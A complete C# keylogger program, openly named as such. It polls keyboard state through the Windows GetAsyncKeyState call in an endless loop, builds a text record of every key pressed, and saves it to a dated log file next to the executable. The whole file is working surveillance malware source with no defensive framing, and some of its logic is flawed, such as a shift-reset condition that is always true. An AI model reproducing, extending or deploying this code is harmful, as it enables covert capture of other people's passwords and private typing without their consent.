using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Keylogger
{
    static class Program
    {

        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        static void Main(string[] args)
        {
            bool isShift = false;
            bool isCapital = false;
            string text = "";

            while (true)
            {
                Thread.Sleep(100);
                
                for (int keyCode = 0; keyCode < 255; keyCode++)
                {
                    int keyState = GetAsyncKeyState(keyCode);

                    if (keyState != 0)
                    {
                        String keyString = "";

                        // If shift pressed
                        if ( 
                            (((Keys)keyCode) == Keys.ShiftKey) ||
                            (((Keys)keyCode) == Keys.LShiftKey) ||
                            (((Keys)keyCode) == Keys.RShiftKey)
                        ) { 
                            isShift = !isShift; 
                        }
                        // If capital pressed
                        else  if (((Keys)keyCode) == Keys.Capital)
                        {
                            isCapital = !isCapital;
                        }

                        // if letters pressed 
                        if (
                                (!isShift && !isCapital) &&
                                (keyCode >= 65 && keyCode <= 90)
                            ) 
                        {
                           keyString = ((Keys)keyCode).ToString().ToLower(); // Convert from ASCII to STRING        
                        } 
                        else
                        {
                            // Replace caracters
                            if (((Keys)keyCode) == Keys.Space) { keyString = " "; }
                            else if (((Keys)keyCode) == Keys.Enter) { keyString = "\n"; }
                            else if (((Keys)keyCode) == Keys.Tab) { keyString = "\t"; }
                            else if (keyCode == 52) { keyString = "'"; }

                            // Ignore the mouse buttons
                            else if ((((Keys)keyCode) == Keys.LButton) || (((Keys)keyCode) == Keys.RButton)) { keyString = ""; }

                            else if (keyCode >= 96 && keyCode <= 105)
                            {
                                keyString = ((Keys)keyCode).ToString().Substring(6);
                            }
                            
                            else if ((keyCode < 65 || keyCode > 90))
                            {
                                keyString = "<" + ((Keys)keyCode).ToString().ToUpper() + ">";
                            }

                            else
                            {
                                keyString = ((Keys)keyCode).ToString(); // Convert from ASCII to STRING
                            }
                            
                        }
                        
                        // Remove the shift
                        if (
                            (isShift) &&
                            (
                                (((Keys)keyCode) != Keys.ShiftKey) ||
                                (((Keys)keyCode) != Keys.LShiftKey) ||
                                (((Keys)keyCode) != Keys.RShiftKey)
                            )
                        ) {
                            isShift = false;
                        }

                        // Write the logs

                        // https://docs.microsoft.com/fr-fr/dotnet/standard/io/how-to-write-text-to-a-file
                        string path = System.IO.Path.GetDirectoryName(Application.ExecutablePath);
                        string fileName = "log-" + DateTime.UtcNow.ToString("MM-dd-yyyy") + ".log";
                        File.WriteAllText(Path.Combine(path, fileName), text);
                       
                        text = text + keyString;
                        Console.WriteLine(text);
                    }
                }
            }

        }

    }
}
